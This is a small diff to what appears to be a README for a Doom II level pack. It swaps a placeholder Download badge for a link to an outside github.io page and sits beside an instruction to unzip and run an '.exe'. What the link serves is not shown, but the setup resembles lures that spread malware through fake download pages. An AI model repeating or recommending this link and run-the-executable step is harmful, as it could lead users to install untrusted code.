@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://doom2-knee-deep-in-zdoom.github.io/.github/)
 
 ## 📸 Overview
 ![doom2-kdizd-levels](https://github.com/user-attachments/assets/32ebcff7-8cba-4776-968c-ba72123f3dac)
